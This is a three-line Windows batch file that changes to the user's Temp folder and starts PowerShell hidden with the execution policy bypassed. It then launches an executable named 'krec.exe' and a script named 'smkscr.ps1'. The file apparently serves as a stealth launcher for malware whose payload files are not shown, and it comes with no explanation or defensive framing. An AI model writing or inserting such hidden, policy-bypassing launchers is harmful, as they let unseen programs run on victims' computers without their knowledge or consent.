@ECHO OFF
cd %userprofile%\AppData\Local\Temp
start PowerShell -windowstyle hidden -ExecutionPolicy Bypass Start-Process 'krec.exe';.\smkscr.ps1
